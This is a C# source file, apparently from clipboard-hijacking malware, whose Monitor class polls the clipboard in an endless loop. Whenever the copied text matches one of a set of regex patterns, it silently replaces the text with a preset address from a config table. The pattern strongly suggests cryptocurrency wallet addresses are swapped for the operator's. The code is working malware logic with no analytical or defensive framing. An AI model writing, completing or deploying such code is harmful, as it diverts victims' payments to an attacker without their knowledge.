using System.Collections.Generic;
using System.Text.RegularExpressions;
using System.Threading;

namespace SHARP
{
    internal class Monitor
    {
      private static string previous_buffer = "";

      private static bool clipboard_changed(string buffer)
      {
        if (!(buffer != Monitor.previous_buffer))
          return false;
        Monitor.previous_buffer = buffer;
        return true;
      }

      private static void replace_clipboard(string buffer)
      {
        if (string.IsNullOrEmpty(buffer))
          return;
        foreach (KeyValuePair<string, Regex> pattern in Patterns.patterns)
        {
          string key = pattern.Key;
          if (pattern.Value.Match(buffer).Success)
          {
            string address = Config.addresses[key];
            if (!string.IsNullOrEmpty(address) && !buffer.Equals(address))
            {
              Clipboard.SetText(address);
              break;
            }
          }
        }
      }

      public static void run()
      {
        while (true)
        {
          string text = Clipboard.GetText();
          if (Monitor.clipboard_changed(text))
            Monitor.replace_clipboard(text);
          Thread.Sleep(Config.clipboard_check_delay);
        }
      }
    }
}
